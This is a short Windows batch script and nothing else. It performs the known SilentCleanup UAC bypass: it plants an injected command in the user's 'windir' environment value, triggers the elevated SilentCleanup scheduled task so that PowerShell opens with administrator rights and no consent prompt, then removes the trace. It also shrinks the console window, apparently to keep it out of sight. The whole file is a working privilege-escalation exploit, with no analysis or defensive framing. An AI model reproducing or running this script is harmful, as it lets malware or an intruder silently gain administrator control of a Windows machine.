@echo off
mode 18,1
color FE
reg add "HKCU\Environment" /v "windir" /d "cmd /c start powershell&REM " >nul
timeout /t 2 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F